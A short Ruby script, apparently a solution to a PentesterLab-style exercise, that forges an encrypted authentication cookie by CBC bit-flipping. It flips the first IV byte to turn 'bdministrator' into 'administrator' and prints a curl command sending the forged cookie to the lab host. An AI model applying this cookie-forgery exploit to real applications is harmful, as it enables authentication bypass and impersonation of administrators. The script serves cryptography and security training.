require 'uri'
require 'base64'

iv = "OGIm0Uded%2F0%3D"
auth = "YmRtaW5pc3RyYXRvci0t5tu1%2FWern2c%3D"


decoded_iv = Base64.decode64(URI.unescape(iv))
decoded_auth = Base64.decode64(URI.unescape(auth))
#
# malicious_iv = 'a'^'b'^decoded_iv[0]
# malicious_iv = ('a'^'b'^decoded_iv[0].ord).chr
#
decoded_iv[0] = ('a'.ord^'b'.ord^decoded_iv[0].ord).chr 
decoded_auth[0] = 'a'

new_iv = URI.escape(Base64.strict_encode64(decoded_iv), "+=/")
new_auth = URI.escape(Base64.strict_encode64(decoded_auth), "+=/")
puts "curl -H 'Cookie: iv=#{new_iv}; auth=#{new_auth}' http://ptl-acb9472b-1d8dc4d4.libcurl.so/index.php" 
